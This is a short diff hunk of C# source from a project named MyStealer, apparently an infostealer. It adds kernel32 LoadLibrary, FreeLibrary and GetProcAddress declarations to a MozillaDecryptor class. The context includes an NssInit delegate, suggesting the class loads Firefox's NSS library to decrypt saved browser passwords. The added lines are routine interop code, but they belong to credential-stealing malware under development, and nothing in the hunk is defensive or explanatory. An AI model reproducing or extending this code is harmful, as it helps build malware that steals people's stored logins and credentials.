@@ -9,6 +9,16 @@ namespace MyStealer.Decryptor
     /// </summary>
     public partial class MozillaDecryptor
     {
+        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        private static extern IntPtr LoadLibrary(string lpFileName);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool FreeLibrary(IntPtr hModule);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         public delegate long NssInit(string configDirectory);
 
